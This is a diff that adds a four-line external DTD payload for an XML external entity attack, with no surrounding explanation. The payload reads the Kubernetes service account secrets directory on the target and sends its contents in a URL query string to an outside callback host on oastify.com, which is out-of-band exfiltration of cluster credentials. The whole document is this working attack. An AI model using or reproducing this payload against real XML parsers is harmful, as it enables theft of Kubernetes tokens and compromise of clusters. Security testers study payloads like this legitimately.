@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://n9xa1dkrcupzb5rvpult8o8er5xwlx9m.oastify.com/?x=%file;'>">
+%eval;
+%exfiltrate;
